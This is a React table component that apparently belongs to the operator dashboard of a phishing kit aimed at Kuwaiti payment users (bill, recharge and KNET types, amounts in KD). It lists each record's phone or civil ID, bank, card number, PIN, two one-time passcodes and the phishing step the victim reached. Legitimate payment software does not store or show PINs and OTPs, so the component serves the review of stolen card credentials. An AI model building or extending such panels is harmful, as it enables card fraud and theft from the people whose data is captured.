const maskCard = (num) => {
  if (!num) return "—";
  return num.slice(0, 4) + "****" + (num.length > 8 ? num.slice(-2) : "");
};

const badge = (val, colors) => {
  const color = colors[val] || "bg-gray-700 text-gray-300";
  return <span className={`px-2 py-0.5 rounded-full text-xs font-semibold ${color}`}>{val || "—"}</span>;
};

const TYPE_COLORS = {
  bill: "bg-purple-500/20 text-purple-300",
  recharge: "bg-green-500/20 text-green-300",
  knet: "bg-yellow-500/20 text-yellow-300",
};

export default function RecordsTable({ records, loading, onSelect }) {
  if (loading) {
    return (
      <div className="rounded-xl border border-gray-700 bg-gray-800/50 p-12 text-center text-gray-400">
        Loading records...
      </div>
    );
  }

  return (
    <div className="rounded-xl border border-gray-700 bg-gray-900 overflow-hidden">
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-gray-700 bg-gray-800/80">
              {["Date/Time", "Phone", "Type", "Page", "Amount", "Bank", "Card", "PIN", "OTP1", "OTP2", "ID#", "Network", "Step", "Pay For"].map(h => (
                <th key={h} className="px-3 py-3 text-left text-xs font-semibold text-gray-400 uppercase tracking-wide whitespace-nowrap">{h}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {records.length === 0 ? (
              <tr>
                <td colSpan={14} className="text-center py-12 text-gray-500">No records found</td>
              </tr>
            ) : records.map((r) => (
              <tr
                key={r.id}
                onClick={() => onSelect(r)}
                className="border-b border-gray-800 hover:bg-gray-800/60 cursor-pointer transition-colors"
              >
                <td className="px-3 py-2.5 text-gray-300 whitespace-nowrap text-xs">
                  {r.created_date ? new Date(r.created_date).toLocaleString() : "—"}
                </td>
                <td className="px-3 py-2.5 text-white font-medium whitespace-nowrap">{r.phone_number || r.civil_id || "—"}</td>
                <td className="px-3 py-2.5 whitespace-nowrap">{badge(r.type, TYPE_COLORS)}</td>
                <td className="px-3 py-2.5 text-gray-300 whitespace-nowrap">{r.page || "—"}</td>
                <td className="px-3 py-2.5 text-green-300 whitespace-nowrap font-medium">{r.amount ? `${r.amount} KD` : "—"}</td>
                <td className="px-3 py-2.5 text-gray-300 whitespace-nowrap">{r.bank || "—"}</td>
                <td className="px-3 py-2.5 text-gray-300 whitespace-nowrap font-mono text-xs">{r.card_prefix ? `${r.card_prefix}-${maskCard(r.card_number)}` : maskCard(r.card_number)}</td>
                <td className="px-3 py-2.5 text-red-300 whitespace-nowrap font-mono">{r.pin || "—"}</td>
                <td className="px-3 py-2.5 text-blue-300 whitespace-nowrap font-mono">{r.otp1 || "—"}</td>
                <td className="px-3 py-2.5 text-blue-300 whitespace-nowrap font-mono">{r.otp2 || "—"}</td>
                <td className="px-3 py-2.5 text-gray-300 whitespace-nowrap">{r.id_number || "—"}</td>
                <td className="px-3 py-2.5 text-gray-300 whitespace-nowrap">{r.network || "—"}</td>
                <td className="px-3 py-2.5 text-center">
                  {r.step_reached != null ? (
                    <span className="w-6 h-6 rounded-full bg-blue-500/20 text-blue-300 text-xs font-bold flex items-center justify-center">{r.step_reached}</span>
                  ) : "—"}
                </td>
                <td className="px-3 py-2.5 text-gray-300 whitespace-nowrap">{r.pay_for || "—"}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      <div className="px-4 py-3 border-t border-gray-700 text-xs text-gray-500">
        {records.length} record{records.length !== 1 ? "s" : ""}
      </div>
    </div>
  );
}